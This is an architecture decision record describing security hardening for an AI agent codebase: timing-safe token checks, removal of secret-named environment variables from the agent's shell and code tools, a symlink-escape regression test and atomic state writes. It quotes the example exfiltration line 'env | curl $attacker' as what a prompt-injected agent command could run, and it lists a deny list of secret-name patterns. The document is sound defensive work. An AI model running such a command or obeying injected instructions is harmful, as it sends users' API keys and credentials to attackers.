# ADR 0175 — Subprocess + transport security hardening

**Status:** Accepted (2026-06-10)

## Context

A defensive security review of the codebase (2026-06-10) surfaced a small
set of implementation-level weaknesses in the parts of Chimera that touch
untrusted input or hold secrets. None were design flaws — the guard
architecture (scope checks, witness panels, trust ladder, secret scanning)
is sound — but four concrete issues were verified first-hand:

1. **Timing-unsafe bearer-token comparison.** The HTTP MCP server compared
   the incoming bearer token with `==` (and a `token in dict` membership
   test for the per-peer map). Both short-circuit on the first mismatching
   byte, leaking the token through response-time variation — a classic
   timing side-channel that lets an attacker recover the token byte-by-byte.
   ([`http_server.py`](../../chimera/server/http_server.py))

2. **Subprocess secret inheritance.** The `shell` and `code_exec` tools
   spawned children with the parent's **entire** environment, including
   `ANTHROPIC_API_KEY`, `OPENROUTER_API_KEY`, the peer bearer token, and any
   cloud credentials present at launch. Because the agent executes
   model-generated commands and code, a single prompt-injected
   `env | curl $attacker` (or its Python equivalent) would exfiltrate every
   secret in one shot. This is the highest-impact issue in the set.
   ([`shell.py`](../../chimera/tools/shell.py),
   [`code_exec.py`](../../chimera/tools/code_exec.py))

3. **Symlink-traversal-via-cwd (claimed).** The review flagged the tool
   cwd-boundary check as bypassable by planting a symlink under `mind/` or
   `state/` pointing outside the roots. **Empirically falsified:** both
   resolvers already call `Path.resolve()`, which canonicalises the symlink
   target before the containment check, so `mind/escape -> /etc` resolves to
   `/etc` and is correctly rejected (verified against the live functions).
   The residual risk is *regression*: a future refactor that swaps
   `.resolve()` for a lexical join (`os.path.normpath`) would silently
   reopen the escape.

4. **Non-atomic trust-state write.** `TrustManager.save()` wrote
   `trust_state.json` with a plain `write_text`. A crash or concurrent write
   mid-save leaves a truncated/empty file, which `_load()` silently reads as
   a fresh **T0** state — collapsing earned trust with no error.
   ([`manager.py`](../../chimera/trust/manager.py))

## Decision

Fix all four at the implementation level; do not change the security
*architecture*.

### 1. Constant-time token comparison

Use `hmac.compare_digest` for both the per-peer token map (walked
explicitly so the dict's hash lookup can't reintroduce an early-out) and
the shared `expected_token`. Accept/reject semantics are unchanged; only the
timing profile changes. Regression test added asserting valid shared and
per-peer tokens still authenticate.

### 2. Denylist-based subprocess env hygiene

New module [`sandbox_env.py`](../../chimera/tools/sandbox_env.py):
`sanitized_subprocess_env()` returns a copy of `os.environ` with
**secret-named** variables removed, and both tools pass it as `env=` to
`create_subprocess_exec`.

Design choice — **denylist by name pattern, not allowlist.** The agent's
whole job depends on a working toolchain (`uv run pytest`, `git commit`,
`ruff`…), and those tools read a wide, hard-to-enumerate set of operational
vars (`HOME`, `PATH`, `GIT_*`, `UV_*`, `LANG`/`LC_*`, `VIRTUAL_ENV`,
`CHIMERA_*`…). A tight allowlist would silently break legitimate work. The
stated threat is *secret exfiltration*, so we strip variables whose **name**
matches a secret pattern (`*API_KEY*`, `*TOKEN*`, `*SECRET*`, `*PASSWORD*`,
`*CREDENTIAL*`, `*PRIVATE_KEY*`, provider brands…) and pass everything else
through.

Notable: bare `AUTH` is deliberately **not** a pattern — it would strip
`GIT_AUTHOR_*`, which git needs; real auth secrets carry `TOKEN`/`KEY`/
`SECRET` and are caught anyway. This is name-based and therefore not a
complete data-flow control: a secret stashed under an innocuous name would
survive. It closes the realistic high-impact case without breaking the
toolchain. Network-level egress isolation for `code_exec` (already tracked
as a TODO) remains the defence for the residual case.

### 3. Make `.resolve()`'s security role explicit

Rather than add a symlink-component rejection — which would wrongly break
legitimately symlinked roots (macOS symlinks `/tmp`→`/private/tmp`; an
operator may symlink `mind/` to another disk) — both resolvers now carry a
`SECURITY BOUNDARY` comment explaining that `.resolve()` is load-bearing and
must not be swapped for a lexical join. A regression test plants a
`mind/escape -> /etc` symlink and asserts the cwd is rejected.

### 4. Atomic trust-state write

`save()` now serialises to a temp file in the same directory, `fsync`s, and
`os.replace`s into place (atomic on POSIX + Windows); on any error the temp
file is unlinked and the exception propagates, leaving the prior file
intact. A reader sees either the old file or the new one, never a partial.
Regression test forces `os.replace` to raise and asserts the prior file is
preserved with no orphaned temp file.

### Also in this pass

- Cleared the repo's ruff debt (27 findings: an undeclared `Sequence`
  import in `act.py`, dead locals, semicolon/colon-compound statements,
  misplaced test imports) and **added `ruff check chimera tests` as a CI
  gate** in [`.github/workflows/ci.yml`](../../.github/workflows/ci.yml).
  The lint/CI gap is how that debt accumulated; closing it prevents
  recurrence.

## Consequences

- The HTTP transport is no longer trivially timing-attackable. TLS for
  non-loopback binds remains a separate, larger decision (the server still
  serves cleartext; `_check_bind_security` blocks anonymous non-loopback
  binds but not unencrypted ones).
- Child processes of `shell`/`code_exec` no longer see API keys or peer
  tokens. Operators relying on a custom secret-named env var inside an
  agent-run command should rename it to a non-secret pattern or pass it
  explicitly.
- Trust state survives a crash mid-save; earned tiers are no longer silently
  reset by a truncated file.
- CI now fails on lint regressions, not just test failures.

## Falsification / revisit triggers

- If a legitimate toolchain var is found to match a secret pattern and break
  a real agent workflow, add it to `_NAME_ALLOW_EXACT` in `sandbox_env.py`.
- If federation ever moves off loopback, this ADR's cleartext-transport
  caveat must be closed by a follow-up TLS ADR before that ships.
